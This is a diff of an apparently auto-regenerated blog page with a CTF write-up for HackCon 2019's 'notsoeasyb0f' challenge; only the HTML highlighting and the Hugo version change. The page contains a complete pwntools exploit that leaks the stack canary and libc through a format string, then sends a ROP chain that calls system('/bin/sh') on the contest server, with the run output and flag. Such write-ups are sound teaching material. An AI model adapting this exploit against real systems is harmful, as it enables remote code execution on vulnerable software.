@@ -68,7 +68,7 @@
 
 
 <script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
- <meta name="generator" content="Hugo 0.92.2" />
+ <meta name="generator" content="Hugo 0.98.0" />
         
 
         
@@ -159,39 +159,39 @@
 </blockquote>
 <p>In addition to the binary there is also a specific libc.</p>
 <p>You can download the binary <a href="/ctf/hackcon2019/binary/notsoeasyb0f/notsoeasyb0f">here</a> and the libc <a href="/ctf/hackcon2019/binary/notsoeasyb0f/notsoeasyb0f-libc.so">here</a></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ sha256sum notsoeasyb0f notsoeasyb0f-libc.so
-9cdc861043359904c6807d31990f7369c1fec2d25e545e263bb4ae2e5786883e  notsoeasyb0f
-74ca69ada4429ae5fce87f7e3addb56f1b53964599e8526244fecd164b3c4b44  notsoeasyb0f-libc.so
-</code></pre></div><h1 id="exploitation">Exploitation</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sha256sum notsoeasyb0f notsoeasyb0f-libc.so
+</span></span><span style="display:flex;"><span>9cdc861043359904c6807d31990f7369c1fec2d25e545e263bb4ae2e5786883e  notsoeasyb0f
+</span></span><span style="display:flex;"><span>74ca69ada4429ae5fce87f7e3addb56f1b53964599e8526244fecd164b3c4b44  notsoeasyb0f-libc.so
+</span></span></code></pre></div><h1 id="exploitation">Exploitation</h1>
 <p>This program asks for a name, echoes it back, then it asks a sentence. It seems that both input are vulnerable to a buffer overflow.</p>
 <p>However, as the description says, <code>stack canary</code> is enabled.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./notsoeasyb0f
-Enter name : NAME
-Hello
-NAME
-Enter sentence : SENTENCE
-
-$ ./notsoeasyb0f
-Enter name : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-Hello
-*** stack smashing detected ***: &lt;unknown&gt; terminated
-Aborted <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
-
-$ ./notsoeasyb0f
-Enter name : NAME
-Hello
-ASD
-Enter sentence : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-*** stack smashing detected ***: &lt;unknown&gt; terminated
-Aborted <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
-
-$ checksec ./notsoeasyb0f
-    Arch:     amd64-64-little
-    RELRO:    Full RELRO
-    Stack:    Canary found
-    NX:       NX enabled
-    PIE:      PIE enabled
-</code></pre></div><p>Given the protections and the libc, a two stage attack will be performed. First a leak then a <code>ROP</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ./notsoeasyb0f
+</span></span><span style="display:flex;"><span>Enter name : NAME
+</span></span><span style="display:flex;"><span>Hello
+</span></span><span style="display:flex;"><span>NAME
+</span></span><span style="display:flex;"><span>Enter sentence : SENTENCE
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ ./notsoeasyb0f
+</span></span><span style="display:flex;"><span>Enter name : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span></span><span style="display:flex;"><span>Hello
+</span></span><span style="display:flex;"><span>*** stack smashing detected ***: &lt;unknown&gt; terminated
+</span></span><span style="display:flex;"><span>Aborted <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ ./notsoeasyb0f
+</span></span><span style="display:flex;"><span>Enter name : NAME
+</span></span><span style="display:flex;"><span>Hello
+</span></span><span style="display:flex;"><span>ASD
+</span></span><span style="display:flex;"><span>Enter sentence : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span></span><span style="display:flex;"><span>*** stack smashing detected ***: &lt;unknown&gt; terminated
+</span></span><span style="display:flex;"><span>Aborted <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ checksec ./notsoeasyb0f
+</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
+</span></span><span style="display:flex;"><span>    RELRO:    Full RELRO
+</span></span><span style="display:flex;"><span>    Stack:    Canary found
+</span></span><span style="display:flex;"><span>    NX:       NX enabled
+</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
+</span></span></code></pre></div><p>Given the protections and the libc, a two stage attack will be performed. First a leak then a <code>ROP</code>.</p>
 <p>I opened with r2, as usual, and the only interesting function is the vulnerable one: <code>main</code>. And it’s really simple:</p>
 <p><img src="/ctf/hackcon2019/images/notsoeasyb0f-main.jpg" alt="main function"></p>
 <p>It’s vulnerable to <code>buffer overflow</code> and <code>format string</code> vulnerabilities. The former is at the second <code>fgets</code>, the latter is at the second <code>printf</code>.</p>
@@ -202,70 +202,70 @@ Then the <code>bof</code> to build a simple <code>ROP chain</code>. With trial a
 <li>13 to leak the <code>saved EIP</code> of the <code>main</code>. In fact the latter is in the <code>__libc_start_main</code>, so in the <code>libc</code></li>
 </ul>
 <p>This is my exploit:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-
-prog <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;PATH_TO_THE_BINARY&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
-
-<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
-        host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;68.183.158.95&#34;</span>
-        port <span style="color:#f92672">=</span> <span style="color:#ae81ff">8991</span>
-        t <span style="color:#f92672">=</span> remote(host, port)
-        system_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">150368</span>
-        binsh_offset  <span style="color:#f92672">=</span> <span style="color:#ae81ff">1492263</span>
-        ret_offset    <span style="color:#f92672">=</span> <span style="color:#ae81ff">263</span>
-        prdi_offset   <span style="color:#f92672">=</span> <span style="color:#ae81ff">1393839</span>
-<span style="color:#66d9ef">else</span>:
-        t <span style="color:#f92672">=</span> prog<span style="color:#f92672">.</span>process()
-        <span style="color:#75715e"># these offsets should be customized locally</span>
-        system_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
-        binsh_offset  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
-        ret_offset    <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
-        prdi_offset   <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
-
-
-<span style="color:#75715e"># leak canary</span>
-t<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;%11$p%13$p&#34;</span>)
-t<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Hello</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
-canary <span style="color:#f92672">=</span> int(t<span style="color:#f92672">.</span>recv(numb<span style="color:#f92672">=</span><span style="color:#ae81ff">18</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>), <span style="color:#ae81ff">16</span>)
-libc_leak <span style="color:#f92672">=</span> int(t<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>), <span style="color:#ae81ff">16</span>)
-system_libc <span style="color:#f92672">=</span> libc_leak <span style="color:#f92672">+</span> system_offset
-binsh_libc <span style="color:#f92672">=</span> libc_leak <span style="color:#f92672">+</span> binsh_offset
-ret_libc <span style="color:#f92672">=</span> libc_leak <span style="color:#f92672">+</span> ret_offset
-prdi_libc <span style="color:#f92672">=</span> libc_leak <span style="color:#f92672">+</span> prdi_offset
-log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;CANARY: </span><span style="color:#e6db74">{:#x}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(canary))
-log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;LIBC  : </span><span style="color:#e6db74">{:#x}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(libc_leak))
-log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;SYSTEM: </span><span style="color:#e6db74">{:#x}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(system_libc))
-log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;BINSH : </span><span style="color:#e6db74">{:#x}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(binsh_libc))
-log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;PRDI  : </span><span style="color:#e6db74">{:#x}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(prdi_libc))
-log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;RET   : </span><span style="color:#e6db74">{:#x}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(ret_libc))
-
-canary_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">24</span>
-payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;P&#34;</span><span style="color:#f92672">*</span>canary_offset
-payload <span style="color:#f92672">+=</span> p64(canary)
-payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;P&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
-payload <span style="color:#f92672">+=</span> p64(ret_libc)  <span style="color:#75715e"># ret</span>
-payload <span style="color:#f92672">+=</span> p64(prdi_libc) <span style="color:#75715e"># pop rdi</span>
-payload <span style="color:#f92672">+=</span> p64(binsh_libc)
-payload <span style="color:#f92672">+=</span> p64(system_libc)
-
-t<span style="color:#f92672">.</span>sendline(payload)
-t<span style="color:#f92672">.</span>recvrepeat(<span style="color:#ae81ff">0.3</span>)
-t<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;cat flag.txt&#34;</span>)
-print t<span style="color:#f92672">.</span>recvline()
-t<span style="color:#f92672">.</span>close()
-</code></pre></div><p>And this is the flag:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./exploit.py <span style="color:#ae81ff">1</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 68.183.158.95 on port 8991: Done
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> CANARY: 0x38d86c5026063f00
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> LIBC  : 0x7fa7fd1fc830
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> SYSTEM: 0x7fa7fd221390
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> BINSH : 0x7fa7fd368d57
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PRDI  : 0x7fa7fd350cdf
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> RET   : 0x7fa7fd1fc937
-d4rk<span style="color:#f92672">{</span>H3ll0_R0p<span style="color:#f92672">}</span>c0de
-
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed connection to 68.183.158.95 port <span style="color:#ae81ff">8991</span>
-</code></pre></div><p><img src="/ctf/hackcon2019/images/notsoeasyb0f-solved.jpg" alt="notsoeasyb0f solved banner"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>prog <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;PATH_TO_THE_BINARY&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>        host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;68.183.158.95&#34;</span>
+</span></span><span style="display:flex;"><span>        port <span style="color:#f92672">=</span> <span style="color:#ae81ff">8991</span>
+</span></span><span style="display:flex;"><span>        t <span style="color:#f92672">=</span> remote(host, port)
+</span></span><span style="display:flex;"><span>        system_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">150368</span>
+</span></span><span style="display:flex;"><span>        binsh_offset  <span style="color:#f92672">=</span> <span style="color:#ae81ff">1492263</span>
+</span></span><span style="display:flex;"><span>        ret_offset    <span style="color:#f92672">=</span> <span style="color:#ae81ff">263</span>
+</span></span><span style="display:flex;"><span>        prdi_offset   <span style="color:#f92672">=</span> <span style="color:#ae81ff">1393839</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        t <span style="color:#f92672">=</span> prog<span style="color:#f92672">.</span>process()
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># these offsets should be customized locally</span>
+</span></span><span style="display:flex;"><span>        system_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>        binsh_offset  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>        ret_offset    <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>        prdi_offset   <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># leak canary</span>
+</span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;%11$p%13$p&#34;</span>)
+</span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Hello</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> int(t<span style="color:#f92672">.</span>recv(numb<span style="color:#f92672">=</span><span style="color:#ae81ff">18</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>), <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>libc_leak <span style="color:#f92672">=</span> int(t<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>), <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>system_libc <span style="color:#f92672">=</span> libc_leak <span style="color:#f92672">+</span> system_offset
+</span></span><span style="display:flex;"><span>binsh_libc <span style="color:#f92672">=</span> libc_leak <span style="color:#f92672">+</span> binsh_offset
+</span></span><span style="display:flex;"><span>ret_libc <span style="color:#f92672">=</span> libc_leak <span style="color:#f92672">+</span> ret_offset
+</span></span><span style="display:flex;"><span>prdi_libc <span style="color:#f92672">=</span> libc_leak <span style="color:#f92672">+</span> prdi_offset
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;CANARY: </span><span style="color:#e6db74">{:#x}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(canary))
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;LIBC  : </span><span style="color:#e6db74">{:#x}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(libc_leak))
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;SYSTEM: </span><span style="color:#e6db74">{:#x}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(system_libc))
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;BINSH : </span><span style="color:#e6db74">{:#x}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(binsh_libc))
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;PRDI  : </span><span style="color:#e6db74">{:#x}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(prdi_libc))
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;RET   : </span><span style="color:#e6db74">{:#x}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(ret_libc))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>canary_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">24</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;P&#34;</span><span style="color:#f92672">*</span>canary_offset
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(canary)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;P&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(ret_libc)  <span style="color:#75715e"># ret</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(prdi_libc) <span style="color:#75715e"># pop rdi</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(binsh_libc)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(system_libc)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>recvrepeat(<span style="color:#ae81ff">0.3</span>)
+</span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;cat flag.txt&#34;</span>)
+</span></span><span style="display:flex;"><span>print t<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>close()
+</span></span></code></pre></div><p>And this is the flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ./exploit.py <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 68.183.158.95 on port 8991: Done
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> CANARY: 0x38d86c5026063f00
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> LIBC  : 0x7fa7fd1fc830
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> SYSTEM: 0x7fa7fd221390
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> BINSH : 0x7fa7fd368d57
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PRDI  : 0x7fa7fd350cdf
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> RET   : 0x7fa7fd1fc937
+</span></span><span style="display:flex;"><span>d4rk<span style="color:#f92672">{</span>H3ll0_R0p<span style="color:#f92672">}</span>c0de
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed connection to 68.183.158.95 port <span style="color:#ae81ff">8991</span>
+</span></span></code></pre></div><p><img src="/ctf/hackcon2019/images/notsoeasyb0f-solved.jpg" alt="notsoeasyb0f solved banner"></p>
 </div>
 
     
